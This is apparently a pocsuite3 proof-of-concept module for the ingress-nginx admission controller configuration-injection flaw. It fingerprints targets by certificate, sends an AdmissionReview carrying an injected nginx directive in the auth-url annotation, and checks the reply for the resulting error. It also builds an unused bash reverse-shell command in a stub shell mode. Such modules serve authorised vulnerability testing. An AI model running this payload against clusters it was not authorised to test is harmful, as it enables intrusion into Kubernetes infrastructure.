from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)
from pocsuite3.lib.core.interpreter_option import (
    OptString,
    OptDict,
    OptIP,
    OptPort,
    OptBool,
    OptInteger,
    OptFloat,
    OptItems,
)
from pocsuite3.modules.listener import REVERSE_PAYLOAD
from urllib.parse import urlparse
from typing import Dict, List, Tuple, Optional
import json
import ssl
import socket
from cryptography.hazmat.backends import default_backend
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtensionOID


class DemoPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "wuerror"  # PoC作者的大名
    vulDate = "2025-3-24"  # 漏洞公开的时间,不知道就写今天
    createDate = "2025-4-9"  # 编写 PoC 的日期
    updateDate = "2025-4-9"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities"]  # 漏洞地址来源,0day不用写
    name = "k8s ingress nginx controller配置注入rce PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "k8s"  # 漏洞应用名称
    appVersion = "<1.12.1"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            Nginx Ingress Admission Controller存在多个不同的配置注入，从而使得攻击者在 webhook 对配置验证的过程中执行任意代码。
        """  # 漏洞简要描述
    pocDesc = """
            poc的用法描述
        """  # POC用法描述
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br"
    }

    data = {
        "kind": "AdmissionReview",
        "apiVersion": "admission.k8s.io/v1",
        "request": {
            "uid": "d48aa397-c414-4fb2-a2b0-b28187daf8a6",
            "kind": {
                "group": "networking.k8s.io",
                "version": "v1",
                "kind": "Ingress"
            },
            "resource": {
                "group": "networking.k8s.io",
                "version": "v1",
                "resource": "ingresses"
            },
            "requestKind": {
                "group": "networking.k8s.io",
                "version": "v1",
                "kind": "Ingress"
            },
            "requestResource": {
                "group": "networking.k8s.io",
                "version": "v1",
                "resource": "ingresses"
            },
            "name": "test-2vUEQxorehjNXJo2UfnsfFTeUQJ",
            "namespace": "default",
            "operation": "CREATE",
            "userInfo": {},
            "object": {
                "kind": "Ingress",
                "apiVersion": "networking.k8s.io/v1",
                "metadata": {
                    "name": "test-2vUEQxorehjNXJo2UfnsfFTeUQJ",
                    "namespace": "default",
                    "creationTimestamp": None,
                    "annotations": {
                        "nginx.ingress.kubernetes.io/auth-url": "http://example.com#;load_module test;\n"
                    }
                },
                "spec": {
                    "ingressClassName": "nginx",
                    "rules": [
                        {
                            "host": "2vUEQxorehjNXJo2UfnsfFTeUQJ",
                            "http": {
                                "paths": []
                            }
                        }
                    ]
                },
                "status": {
                    "loadBalancer": {}
                }
            },
            "oldObject": None,
            "dryRun": True,
            "options": {
                "kind": "CreateOptions",
                "apiVersion": "meta.k8s.io/v1"
            }
        }
    }

    def _options(self):
        opt = OrderedDict()  # value = self.get_option('key')
        opt["force"] = OptBool(
            "", description="是否强制发送payload，否则仅验证证书", require=False
        )
        return opt

    def _verify(self):
        result = {}
        #验证证书
        o = urlparse(self.url)
        host = o.hostname
        port = o.port
        force = self.get_option("force")

        is_cert, cert_data, error = check_target(host, port)
        if is_cert or force:
            # 验证代码
            res = requests.post(self.url, headers=self.headers, json=self.data, verify=False)
            if res.status_code == 200:
                cd1 = "AdmissionReview" in res.text
                cd2 = 'directive is not allowed here' in res.text
                cd3 = 'load_module' in res.text
                if cd1 and cd2 and cd3:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
                    result['VerifyInfo']['Subject Alternative Name'] = cert_data.subject_an
                    result['Stdout'] = res.text

        return self.parse_output(result)

    def _attack(self):
        output = Output(self)
        result = {}
        # 攻击代码
        pass

    def _shell(self):
        """
        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出
        """
        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        # 攻击代码 execute cmd
        pass


    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


class CertificateData:
    def __init__(self):
        self.issuer_org: List[str] = []
        self.subject_org: List[str] = []
        self.subject_an: List[str] = []
    
    def to_dict(self) -> Dict:
        return {
            "issuer_org": self.issuer_org,
            "subject_org": self.subject_org,
            "subject_an": self.subject_an
        }
    
    def __str__(self) -> str:
        return json.dumps(self.to_dict(), indent=2)


def extract_cert_info(cert: x509.Certificate) -> CertificateData:
    """从 X509 证书对象中提取信息"""
    cert_data = CertificateData()
    
    # 提取颁发者组织
    issuer = cert.issuer
    org_attrs = issuer.get_attributes_for_oid(NameOID.ORGANIZATION_NAME)
    cert_data.issuer_org = [attr.value for attr in org_attrs]
    
    # 提取主体组织
    subject = cert.subject
    org_attrs = subject.get_attributes_for_oid(NameOID.ORGANIZATION_NAME)
    cert_data.subject_org = [attr.value for attr in org_attrs]
    
    # 提取主题备用名称 (SAN)
    try:
        san_ext = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
        san = san_ext.value
        cert_data.subject_an = [name.value for name in san if isinstance(name, x509.DNSName)]
    except x509.ExtensionNotFound:
        pass
    
    return cert_data


def check_target(host: str, port: int) -> Tuple[bool, Optional[CertificateData], Optional[str]]:
    """检查目标"""
    def is_nil_field(values: List[str]) -> bool:
        return any("nil" in value.lower() for value in values)
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with socket.create_connection((host, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                # 获取二进制格式证书
                cert_bin = ssock.getpeercert(binary_form=True)
                if not cert_bin:
                    return False, None, "No certificate found"
                
                # 使用 cryptography 解析证书
                cert = x509.load_der_x509_certificate(cert_bin, default_backend())
                cert_data = extract_cert_info(cert)

               
                # 漏洞判断逻辑
                is_nil1 = is_nil_field(cert_data.issuer_org) or (len(cert_data.issuer_org) == 0)
                is_nil2 = is_nil_field(cert_data.subject_org) or (len(cert_data.subject_org) == 0)
                has_nginx = any("nginx" in name.lower() for name in cert_data.subject_an)
                
                return (is_nil1 and is_nil2 and has_nginx), cert_data, None
                
    except Exception as e:
        return False, None, f"Error: {str(e)}"


# 注册 DemoPOC 类
register_poc(DemoPOC)
